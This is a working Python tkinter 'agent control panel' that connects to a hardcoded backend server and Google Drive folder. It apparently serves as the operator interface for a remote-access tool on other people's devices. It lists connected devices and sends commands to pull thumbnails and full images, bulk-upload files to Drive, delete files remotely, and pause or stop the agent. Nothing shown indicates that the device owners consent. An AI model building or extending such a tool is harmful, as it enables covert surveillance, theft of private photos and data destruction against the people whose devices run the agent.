import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import requests
import threading
from PIL import Image, ImageTk
from io import BytesIO
import base64
import time
import json

# --- CONFIGURACIÓN ---
SERVER_URL = "https://edikpiccx-backend.onrender.com"
DRIVE_FOLDER_ID = "1Tux8uqv--gJjUc9_HrSZZEHsRyuzdJGO" 

# --- LOGGER PARA TERMINAL ---
class Logger:
    @staticmethod
    def info(message): print(f"[INFO] {time.strftime('%H:%M:%S')} - {message}")
    @staticmethod
    def error(message): print(f"[ERROR] {time.strftime('%H:%M:%S')} - {message}")
    @staticmethod
    def debug(message, data=None):
        print(f"[DEBUG] {time.strftime('%H:%M:%S')} - {message}")
        if data: print(json.dumps(data, indent=2))

# --- APLICACIÓN PRINCIPAL ---
class ControlPanelApp(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Panel de Control de Agentes vFINAL")
        self.geometry("1200x750")

        style = ttk.Style(self)
        style.theme_use("clam")
        style.configure("Treeview.Heading", font=("Arial", 10, "bold"))

        self.agents_data = []
        self.photo_references = []
        self.current_media_list = []
        self.original_image_for_download = None

        self.create_widgets()
        self.threaded_task(self.refresh_agent_list)

    def create_widgets(self):
        main_paned_window = ttk.PanedWindow(self, orient=tk.HORIZONTAL)
        main_paned_window.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        left_frame = ttk.Frame(main_paned_window, width=450)
        main_paned_window.add(left_frame, weight=1)
        
        ttk.Label(left_frame, text="Dispositivos Conectados", font=("Arial", 12, "bold")).pack(pady=5, anchor='w')
        
        tree_frame = ttk.Frame(left_frame)
        tree_frame.pack(fill=tk.BOTH, expand=True)
        cols = ('name', 'id')
        self.tree = ttk.Treeview(tree_frame, columns=cols, show='headings')
        self.tree.heading('name', text='Nombre Dispositivo')
        self.tree.heading('id', text='ID Dispositivo')
        self.tree.column('id', width=200)
        self.tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        tree_scrollbar = ttk.Scrollbar(tree_frame, orient="vertical", command=self.tree.yview)
        self.tree.configure(yscrollcommand=tree_scrollbar.set)
        tree_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

        command_frame = ttk.LabelFrame(left_frame, text="Comandos para Dispositivo Seleccionado", padding=10)
        command_frame.pack(fill=tk.X, pady=(10,0), side=tk.BOTTOM)
        
        ttk.Button(command_frame, text="Visualizar Archivos", command=self.visualize_selected_device_files).pack(fill=tk.X, pady=2)
        ttk.Button(command_frame, text="Ordenar Subir Todo a Drive", command=lambda: self.on_command_click("upload_to_drive", DRIVE_FOLDER_ID)).pack(fill=tk.X, pady=2)
        ttk.Button(command_frame, text="Pausar Agente", command=lambda: self.on_command_click("pause_upload")).pack(fill=tk.X, pady=2)
        ttk.Button(command_frame, text="Reanudar Agente", command=lambda: self.on_command_click("continue_upload")).pack(fill=tk.X, pady=2)
        ttk.Button(command_frame, text="Detener Agente (Permanente)", command=lambda: self.on_command_click("stop_agent")).pack(fill=tk.X, pady=2)
        
        right_frame = ttk.Frame(main_paned_window)
        main_paned_window.add(right_frame, weight=2)
        
        ttk.Label(right_frame, text="Visor de Archivos Remotos", font=("Arial", 12, "bold")).pack(pady=5, anchor='w')
        
        canvas = tk.Canvas(right_frame, bg="gray95", highlightthickness=0)
        scrollbar = ttk.Scrollbar(right_frame, orient="vertical", command=canvas.yview)
        self.image_frame = ttk.Frame(canvas)
        self.image_frame.bind("<Configure>", lambda e: canvas.configure(scrollregion=canvas.bbox("all")))
        canvas.create_window((0, 0), window=self.image_frame, anchor="nw")
        canvas.configure(yscrollcommand=scrollbar.set)
        canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill="y")
        
        self.visor_label = ttk.Label(self.image_frame, text="\nSelecciona un dispositivo y haz clic en 'Visualizar Archivos'.", font=("Arial", 11), background="gray95", justify=tk.CENTER)
        self.visor_label.pack(pady=20, padx=20)
        
        status_bar_frame = ttk.Frame(self, padding=(10, 5))
        status_bar_frame.pack(side=tk.BOTTOM, fill=tk.X)
        self.status_bar = ttk.Label(status_bar_frame, text="Listo.", relief=tk.SUNKEN, anchor=tk.W, padding=5)
        self.status_bar.pack(side=tk.LEFT, fill=tk.X, expand=True)
        ttk.Button(status_bar_frame, text="Recargar Lista", command=lambda: self.threaded_task(self.refresh_agent_list)).pack(side=tk.RIGHT)

    def threaded_task(self, task, *args):
        thread = threading.Thread(target=task, args=args, daemon=True)
        thread.start()

    def refresh_agent_list(self, retries=3):
        self.update_status("Contactando al servidor...", "blue")
        Logger.info("Solicitando lista de agentes al servidor...")
        try:
            response = requests.get(f"{SERVER_URL}/api/get-agents", timeout=15)
            response.raise_for_status()
            agents = response.json()
            self.after(0, self._update_treeview, agents)
        except requests.exceptions.RequestException as e:
            Logger.error(f"Fallo en la conexión: {e}")
            if retries > 0:
                Logger.info(f"El servidor podría estar despertando. Reintentando en 5 segundos... ({retries} intentos restantes)")
                self.update_status("Servidor despertando... Reintentando...", "orange")
                self.after(5000, lambda: self.threaded_task(self.refresh_agent_list, retries - 1))
            else:
                Logger.error("No se pudo conectar al servidor después de varios intentos.")
                self.after(0, self.update_status, "Error de conexión persistente.", "red")

    def _update_treeview(self, agents):
        self.tree.delete(*self.tree.get_children())
        self.agents_data = agents
        if not agents:
            Logger.info("No hay agentes conectados.")
            self.update_status("No hay agentes conectados.", "orange")
            return
        for agent in agents:
            self.tree.insert('', tk.END, iid=agent['id'], values=(agent.get('name', 'N/A'), agent['id']))
        status_msg = f"Lista actualizada: {len(self.agents_data)} agentes conectados."
        Logger.info(status_msg)
        self.update_status(status_msg, "green")

    def visualize_selected_device_files(self):
        selected_id = self.get_selected_agent_id()
        if not selected_id: return
        self.update_status(f"Pidiendo lista de archivos a {selected_id[:8]}...", "blue")
        Logger.info(f"Iniciando visualización para el dispositivo {selected_id[:8]}...")
        self.on_command_click("get_thumbnails")
        self.update_status("Esperando respuesta del agente (30 segundos)...", "blue")
        Logger.info("Esperando 30 segundos para que el agente procese y envíe las miniaturas.")
        self.after(30000, lambda: self.threaded_task(self.fetch_and_display_thumbnails, selected_id))

    def fetch_and_display_thumbnails(self, device_id):
        self.update_status(f"Descargando miniaturas de {device_id[:8]}...", "blue")
        Logger.info(f"Descargando lista de miniaturas para {device_id[:8]} desde el servidor.")
        try:
            response = requests.get(f"{SERVER_URL}/api/get_media_list/{device_id}", timeout=15)
            response.raise_for_status()
            media_list = response.json()
            Logger.debug(f"Respuesta del servidor (get_media_list) para {device_id[:8]}:", {"item_count": len(media_list)})
            self.after(0, self.display_thumbnails, media_list, device_id)
        except Exception as e:
            Logger.error(f"No se pudieron obtener las miniaturas desde el servidor: {e}")
            self.after(0, self.update_status, f"Error al obtener miniaturas: {e}", "red")

    def display_thumbnails(self, media_list, device_id):
        for widget in self.image_frame.winfo_children():
            widget.destroy()
        self.photo_references.clear()
        if not media_list:
            ttk.Label(self.image_frame, text="No se encontraron archivos en el dispositivo.", font=("Arial", 11), background="gray95").pack(pady=20)
            self.update_status("El dispositivo no reportó archivos.", "orange")
            return

        self.current_media_list = media_list

        for index, item in enumerate(media_list):
            filename = item['filename']
            item_frame = ttk.Frame(self.image_frame, padding=5, relief=tk.RIDGE, borderwidth=1)
            item_frame.pack(fill=tk.X, padx=5, pady=3)
            
            try:
                img_data = base64.b64decode(item['small_thumb_b64'])
                img = Image.open(BytesIO(img_data))
                img.thumbnail((100, 100))
                photo = ImageTk.PhotoImage(img)
                self.photo_references.append(photo)
                
                img_button = tk.Button(item_frame, image=photo, relief=tk.FLAT, bd=0, command=lambda idx=index: self.open_large_preview(idx))
                img_button.pack(side=tk.LEFT, padx=5)
            except:
                img_label = tk.Label(item_frame, text="[IMG]", width=12, height=6, bg="lightgrey")
                img_label.pack(side=tk.LEFT, padx=5)
            
            ttk.Label(item_frame, text=filename, wraplength=400, justify=tk.LEFT).pack(side=tk.LEFT, padx=10, fill=tk.X, expand=True)
            
            action_frame = ttk.Frame(item_frame)
            action_frame.pack(side=tk.RIGHT, padx=5)
            
            upload_button = ttk.Button(action_frame, text="Subir", command=lambda f=filename, d_id=device_id: self.on_single_file_command("upload_single_file", f, d_id))
            upload_button.pack(pady=2)
            
            delete_button = ttk.Button(action_frame, text="Borrar", command=lambda f=filename, d_id=device_id: self.on_single_file_command("delete_single_file", f, d_id))
            delete_button.pack(pady=2)
            
        self.update_status(f"Mostrando {len(media_list)} archivos del dispositivo {device_id[:8]}.", "green")

    def open_large_preview(self, index):
        item = self.current_media_list[index]
        filename = item['filename']
        preview_window = tk.Toplevel(self)
        preview_window.title(f"Vista Previa - {filename}")
        preview_window.configure(bg="black")
        try:
            large_img_data = base64.b64decode(item['large_thumb_b64'])
            img = Image.open(BytesIO(large_img_data))
            self.original_image_for_download = img.copy()
            img.thumbnail((1200, 900))
            photo = ImageTk.PhotoImage(img)
            img_label = tk.Label(preview_window, image=photo, bg="black")
            img_label.image = photo
            img_label.pack(padx=10, pady=10, expand=True)
            download_button = ttk.Button(preview_window, text=f"Descargar {filename} a PC", command=lambda fn=filename: self.save_image_to_pc(fn))
            download_button.pack(pady=10)
        except Exception as e:
            messagebox.showerror("Error de Vista Previa", f"No se pudo cargar la imagen grande: {e}", parent=preview_window)

    def save_image_to_pc(self, filename):
        if hasattr(self, 'original_image_for_download') and self.original_image_for_download:
            filepath = filedialog.asksaveasfilename(
                defaultextension=".jpg",
                initialfile=filename,
                filetypes=[("JPEG files", "*.jpg"), ("PNG files", "*.png"), ("All files", "*.*")]
            )
            if filepath:
                try:
                    self.original_image_for_download.save(filepath, "JPEG", quality=95)
                    messagebox.showinfo("Éxito", f"Imagen guardada en:\n{filepath}")
                except Exception as e:
                    messagebox.showerror("Error al Guardar", f"No se pudo guardar la imagen: {e}")

    def on_command_click(self, action, payload=""):
        selected_id = self.get_selected_agent_id()
        if not selected_id: return
        command = {"target_id": selected_id, "action": action, "payload": payload}
        self.threaded_task(self._do_send_command, command)

    def _do_send_command(self, command):
        Logger.info(f"Preparando para enviar comando '{command['action']}' al agente {command['target_id'][:8]}.")
        Logger.debug("Enviando JSON al servidor (send-command):", command)
        try:
            response = requests.post(f"{SERVER_URL}/api/send-command", json=command, timeout=10)
            response.raise_for_status()
            response_data = response.json()
            Logger.debug("Respuesta del servidor (send-command):", response_data)
            self.after(0, self.update_status, f"Comando '{command['action']}' enviado con éxito.", "green")
        except Exception as e:
            Logger.error(f"Fallo al enviar el comando '{command['action']}': {e}")
            self.after(0, self.update_status, f"Error al enviar comando: {e}", "red")
            
    def on_single_file_command(self, action, filename, device_id):
        if not device_id:
            messagebox.showerror("Error", "No hay un dispositivo seleccionado.")
            return
        if action == "delete_single_file":
            if not messagebox.askyesno("Confirmar Borrado", f"¿Estás seguro de que quieres borrar permanentemente el archivo '{filename}' del dispositivo?"):
                return
        command = {"target_id": device_id, "action": action, "payload": filename}
        self.threaded_task(self._do_send_command, command)

    def get_selected_agent_id(self):
        try:
            return self.tree.selection()[0]
        except IndexError:
            Logger.error("Intento de comando sin seleccionar un dispositivo.")
            messagebox.showwarning("Sin Selección", "Por favor, selecciona un agente de la lista.")
            return None

    def update_status(self, message, color="black"):
        self.status_bar.config(text=message, foreground=color)

if __name__ == "__main__":
    Logger.info("Iniciando Panel de Control...")
    app = ControlPanelApp()
    app.mainloop()
    Logger.info("Panel de Control cerrado.")
warning
